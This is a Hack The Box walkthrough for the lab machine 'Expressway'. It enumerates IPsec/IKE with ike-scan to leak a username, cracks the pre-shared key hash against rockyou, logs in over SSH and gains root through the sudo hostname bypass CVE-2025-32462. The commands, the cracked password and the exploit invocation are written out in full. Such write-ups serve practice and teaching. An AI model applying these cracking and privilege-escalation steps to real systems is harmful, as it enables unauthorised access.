---
layout: post
title: "[HTB] Expressway"
description: "Expressway is an Easy Linux machine with only SSH and IPsec/IKE exposed on UDP 500. Aggressive mode IKE scanning reveals a username and allows PSK hash extraction, cracked with psk-crack against rockyou to yield SSH credentials. Privilege escalation exploits CVE-2025-32462, a sudo hostname bypass, by discovering an alternate hostname in squid access logs and running sudo -h to obtain a root shell."
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---
![](/img/htb_img/Expressway_img/img1.png)

- OS: Linux
- Release Date: 20 Sep 2025
- Difficulty: Easy

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --open -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 18:36 CEST
Initiating SYN Stealth Scan at 18:36
Scanning 10.10.xx.xx [65535 ports]
Discovered open port 22/tcp on 10.10.xx.xx
Completed SYN Stealth Scan at 18:36, 19.92s elapsed (65535 total ports)
Nmap scan report for 10.10.xx.xx
Host is up, received user-set (0.049s latency).
Not shown: 64457 closed tcp ports (reset), 1077 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.01 seconds
           Raw packets sent: 68143 (2.998MB) | Rcvd: 65118 (2.605MB)
```

Only port 22 (SSH) open.

### UDP Scan
```
Nmap scan report for 10.10.xx.xx
Host is up (1.1s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT        STATE           SERVICE
68/udp      open|filtered   dhcpc
69/udp      open|filtered   tftp
500/udp     open            isakmp
4500/udp    open|filtered   nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 1135.98 seconds
```

We have a service on port 500 (ISAKMP).

> **ISAKMP** — UDP port 500 is reserved for ISAKMP, the Internet Security Association and Key Management Protocol. ISAKMP defines a framework for negotiating, establishing, modifying, and deleting Security Associations (SAs) between peers. In practice, ISAKMP is almost always used by IKE (Internet Key Exchange), which sets up secure communication channels in IPsec VPNs. When two hosts initiate an IPsec tunnel, they use UDP/500 to exchange IKE Phase 1 messages, authenticating each other via pre-shared keys, digital certificates, or Kerberos.

```
❯ echo "$target expressway.htb" | sudo tee -a /etc/hosts
10.10.xx.xx expressway.htb
```

## UDP 500: ISAKMP
Let's scan the server with `ike-scan`.
### Main Mode
```
❯ ike-scan -M expressway.htb
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.xx.xx	Main Mode Handshake returned
	HDR=(CKY-R=9fe715806b855fce)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.876 seconds (1.14 hosts/sec).  1 returned handshake; 0 returned notify
```

### Aggressive Mode
```
❯ ike-scan -A expressway.htb
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.xx.xx	Aggressive Mode Handshake returned HDR=(CKY-R=0d130fb4a4ab9f00) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.060 seconds (16.60 hosts/sec).  1 returned handshake; 0 returned notify
```
Username found: `ike@expressway.htb`.

# Foothold
### Aggressive Mode with PSK
```
❯ ike-scan -A --pskcrack=psk.txt expressway.htb
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.xx.xx	Aggressive Mode Handshake returned HDR=(CKY-R=0c53fb01d44874ec) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.060 seconds (16.55 hosts/sec).  1 returned handshake; 0 returned notify
❯ catn psk.txt
23b424e43d33dfa961bef8aed80fed6c80e875c94acfc6a57c9177f5c9b02a8062a6a9b6838387545d66dfc2f6bf9fa892de31336cb63ada1aab99617c8ebde4e472ce2b0268ad3496eb2539a5adfeff0a9d0f85dd4de69bedb1fec68fa5b019ada607b1a3011caa7405aa2318a3f608401d08b1c58339a24baf90ad89bd008e:71b292d5271644bcaccdb3ec3be992120d6953d7fa442e0f65bd5c76615e4da1755498139b41ca08642f8d2833536f97d1177bffc61276f08a5a69b8c585e312758682c0f1c277ecdfb6698a435c90f8f4d6ebede6dbd28e5a308e1586f0cfbde770c92b90b989905b0260f79f6f3386ae76121bfd0da6d21d053ba44d759048:0c53fb01d44874ec:264bcf9d4cbc8f79:<...>:11a273fc5c32ee992d470889606a57eaad140794
```

Cracking this `PSK`.
```
❯ psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 11a273fc5c32ee992d470889606a57eaad140794
Ending psk-crack: 8045040 iterations in 10.468 seconds (768517.04 iterations/sec)
```

Credentials: `ike` / `freakingrockstarontheroad`

## User flag
```
❯ ssh ike@expressway.htb
ike@expressway.htb's password: 
Last login: Mon Sep 22 17:50:38 BST 2025 from 10.10.xx.xx on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

ike@expressway:~$ cat user.txt 
<REDACTED>
ike@expressway:~$
```

# Privilege Escalation
I did some basic enumeration with Linpeas and the typical `sudo -l` but I found nothing.
I remembered there is a sudo vulnerability so I checked the version.
```
ike@expressway:/tmp$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Sudo 1.9.17 is vulnerable to CVE-2025-32462.

Using the following exploit:
https://raw.githubusercontent.com/cyberpoul/CVE-2025-32462-POC/refs/heads/main/CVE-2025-32462.sh
```
ike@expressway:/tmp$ ./CVE.sh 
[+] Testing for CVE-2025-32462 bypass via 'sudo -h'...
Password: 
[-] Target not vulnerable or sudoers configuration not exploitable.
ike@expressway:/tmp$ 
```

Seems like it's not vulnerable but in this case is because of the hostname, so let's look for alternative ones on the system.
```
ike@expressway:/tmp$ grep -R ".expressway.htb" /var/log 2>/dev/null
/var/log/squid/access.log.1:1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
ike@expressway:/tmp$
```

Let's run sudo -h with this hostname.
```
ike@expressway:/tmp$ /usr/local/bin/sudo -h offramp.expressway.htb -i
root@expressway:~# id
uid=0(root) gid=0(root) groups=0(root)
root@expressway:~# cat /root/root.txt
<REDACTED>
root@expressway:~#
```
